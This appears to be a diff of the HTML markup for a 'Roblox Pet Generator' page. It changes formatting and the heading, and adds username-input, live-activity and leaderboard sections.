@@ -1,30 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox Pet Generator</title>
-  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <h1>🌙 Roblox Pet Generator</h1>
-    <p class="subtitle">Enter your Roblox username to generate a pet!</p>
+    <h1>🐾 Divine Pet Generator</h1>
 
-    <input type="text" id="username" placeholder="Enter Roblox Username" />
-    <button id="checkBtn">Check Username</button>
+    <!-- Username Input -->
+    <div class="generator-box">
+      <input type="text" id="username" placeholder="Enter Roblox Username">
+      <button id="checkBtn">Start</button>
+      <div id="profile"></div>
+      <div id="result"></div>
+      <div id="serverButton"></div>
+    </div>
 
-    <div id="profile"></div>
-    <div id="result"></div>
-    <div id="serverButton"></div>
+    <!-- Live Activity -->
+    <h2>🎉 Live Activity</h2>
+    <div id="activityFeed" class="activity-feed"></div>
+
+    <!-- Leaderboard -->
+    <h2>🏆 Leaderboard</h2>
+    <div id="leaderboard" class="leaderboard"></div>
   </div>
 
-  <div class="feed-container">
-    <h2>⚡ Live Activity</h2>
-    <div id="activityFeed"></div>
-  </div>
-
-  <!-- ⚠️ IMPORTANT: load JS at the very end -->
   <script src="app.js"></script>
 </body>
 </html>
